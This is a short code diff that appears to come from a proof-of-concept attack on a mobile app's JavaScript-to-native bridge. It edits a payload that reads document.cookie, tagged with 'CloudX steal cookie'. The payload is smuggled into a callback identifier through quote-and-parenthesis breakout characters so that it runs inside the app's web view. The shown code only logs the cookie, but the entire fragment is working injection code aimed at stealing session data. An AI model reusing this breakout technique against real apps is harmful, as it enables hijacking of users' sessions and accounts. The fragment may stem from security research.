@@ -321,9 +321,9 @@
 
 
         // 要注入的代码（移除内部重复的 payload 声明）
-        // const payload = `console.log('cloud:'+document.cookie);if (!location.href.startsWith(\"${currUrl}\") && !window.__cloudx_called) {window.__cloudx_called = true;console.info('CloudX steal cookie : ' + document.cookie);}`;
-        const payload = `console.log('cloud:'+document.cookie);if (!location.href.startsWith(‘https://h5hosting-drcn.dbankcdn.cn’) && !window.__cloudx_called) {window.__cloudx_called = true;console.info('CloudX steal cookie : ' + document.cookie);}`;
-        const callbackId = `${service}${genCallbackId()}');${payload}//`;
+        const payload = `console.log('cloud:'+document.cookie);if (!location.href.startsWith(\"${currUrl}\") && !window.__cloudx_called) {window.__cloudx_called = true;console.info('CloudX steal cookie : ${location.href}');}`;
+        // const payload = `console.log('cloud:'+document.cookie);if (!location.href.startsWith(‘https://h5hosting-drcn.dbankcdn.cn’) && !window.__cloudx_called) {window.__cloudx_called = true;console.info('CloudX steal cookie : ' + document.cookie);}`;
+        const callbackId = `${service}${genCallbackId()}');"${payload}"//`;
 
         if (success || fail) callbackCache[callbackId] = {success, fail};
         // 调用Native方法
